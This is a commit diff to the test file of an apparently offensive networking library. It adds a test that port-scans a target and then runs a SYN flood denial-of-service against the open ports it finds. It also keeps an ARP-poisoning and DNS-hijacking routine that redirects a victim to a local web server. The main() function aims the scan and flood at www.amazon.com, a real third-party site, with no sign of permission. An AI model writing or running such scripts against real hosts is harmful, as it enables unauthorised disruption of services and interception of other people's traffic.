db9073c174ff542451abd969f47c8c792efe36d6
venkat-abhi <venkat.abhishek.1999@gmail.com>
2020-01-05 15:17:16 +1100

    add SYN_FLOOD test

--- tests/tests.py
+++ tests/tests.py
@@ -1,17 +1,29 @@
 import netattacker as sm
 
 class TestAttacker:
-	def test_arp_init(self, capsys):
-		arp_instance = sm.grab('poisoners.arp', target='192.168.1.2')
+	def __init__(self, target:str):
+		self.target = target
+
+	def test_syn_dos(self):
+		port_scanner = sm.grab('scanners.syn', target=self.target)
+		port_scanner.start(verbose=True)
+
+		syn_dos = sm.grab('dos.syn', target=self.target, target_ports=port_scanner.open_ports)
+		syn_dos.start()
+
+	def test_dns_hijacker(self):
+		arp_instance = sm.grab('poisoners.arp', target=self.target)
 
 		arp_instance.print_target_ip()
 
-		dns_hijacker = sm.grab('poisoners.dns', target='192.168.1.2', webserver_ipv4='192.168.1.4')
+		dns_hijacker = sm.grab('poisoners.dns', target=self.target, webserver_ipv4='192.168.1.4')
 		dns_hijacker.start()
 
+
 def main():
-	a = TestAttacker()
-	a.test_arp_init('test')
+	a = TestAttacker(target="www.amazon.com")
+	a.test_syn_dos()
+	# a.test_1('test')
 
 if __name__ == "__main__":
 	main()
